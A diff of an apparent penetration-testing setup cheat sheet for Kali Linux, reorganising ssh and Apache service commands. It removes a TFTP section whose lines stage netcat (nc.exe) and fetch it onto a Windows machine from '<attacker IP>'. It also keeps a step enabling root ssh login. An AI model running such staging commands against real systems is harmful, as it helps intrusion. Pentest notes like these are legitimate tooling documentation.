@@ -13,11 +13,6 @@ ssh-keygen                                       Create new keys
 /etc/ssh/sshd_config                             Daemon config file
 PermitRootLogin yes                              Change to yes
 AuthorizedKeysFile                               Uncomment
-
-service ssh start                                Start ssh
-netstat -antp | grep ssh                         Verify the service is running
-update-rc.d ssh enable                           Enable ssh to start at boot time
-update-rc.d ssh disable                          Disable ssh from starting at boot time
 ------------------------------------------------------------------------------------------------------
 
 # Terminal
@@ -57,13 +52,19 @@ cd /opt/discover/
 ./update.sh
 ------------------------------------------------------------------------------------------------------
 
-# TFTP
+# Services
 
-mkdir /tftp                                      Create a new home folder for tftp
-atftpd --daemon --port 69 /tftp                  Start tftp and assign home folder
-netstat -anup | grep atftp                       Verify the service is running
-cp /usr/share/windows-binaries/nc.exe /tftp/
-tftp -i <attacker IP> get nc.exe                 Run from Windows
+service <service> <start|stop>
+service ssh start                                Start ssh
+netstat -antp | grep ssh                         Verify the ssh service is running
+
+service apache2 start                            Start Apache
+firefox localhost                                Verify the Apache service is running
+/var/www/html/                                   Document root
+
+update-rc.d <service> <enable|disable>
+update-rc.d ssh enable                           Enable ssh to start at boot time
+update-rc.d ssh disable                          Disable ssh from starting at boot time
 ------------------------------------------------------------------------------------------------------
 
 # VPN
@@ -80,3 +81,4 @@ apt-get install network-manager-vpnc network-manager-vpnc-gnome
 nano /etc/network/interfaces
 Remove the last two lines egarding eth0. 
 Reboot
+
